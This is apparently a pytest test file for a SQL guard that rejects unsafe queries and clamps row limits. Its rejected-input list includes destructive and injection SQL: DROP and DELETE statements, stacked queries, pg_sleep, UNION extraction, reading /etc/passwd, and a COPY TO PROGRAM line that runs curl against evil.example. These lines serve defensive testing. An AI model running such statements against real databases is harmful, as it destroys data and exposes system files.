import pytest

from app.db.sql_guard import SqlRejected, validate_and_normalize

REJECTED = [
    "DROP TABLE documents",
    "DELETE FROM documents",
    "SELECT 1; DROP TABLE documents",
    "SELECT pg_sleep(30)",
    "SELECT * FROM conversations",
    "SELECT * FROM documents UNION SELECT 1,2,3,4,5,6,7 FROM messages",
    "WITH x AS (DELETE FROM documents RETURNING *) SELECT * FROM x",
    "SELECT * INTO new_t FROM documents",
    "COPY documents TO PROGRAM 'curl http://evil.example'",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT * FROM pg_catalog.pg_tables",
    "SELECT * FROM generate_series(1, 1000000000)",
    "SELECT (SELECT count(*) FROM messages) FROM documents",
    "SELEC * FROM documents",
]


@pytest.mark.parametrize("sql", REJECTED)
def test_rejected(sql):
    with pytest.raises(SqlRejected):
        validate_and_normalize(sql)


def test_limit_is_clamped():
    assert "LIMIT 100" in validate_and_normalize("SELECT * FROM documents LIMIT 1000000")


def test_with_ties_passes():
    sql = validate_and_normalize(
        "SELECT doc_number FROM documents ORDER BY adopted_date DESC FETCH FIRST 1 ROW WITH TIES"
    )
    assert "WITH TIES" in sql


def test_fetch_is_clamped():
    assert "100" in validate_and_normalize("SELECT doc_number FROM documents FETCH FIRST 100000 ROWS")


def test_valid_queries_pass():
    assert "documents" in validate_and_normalize("SELECT COUNT(*) FROM documents")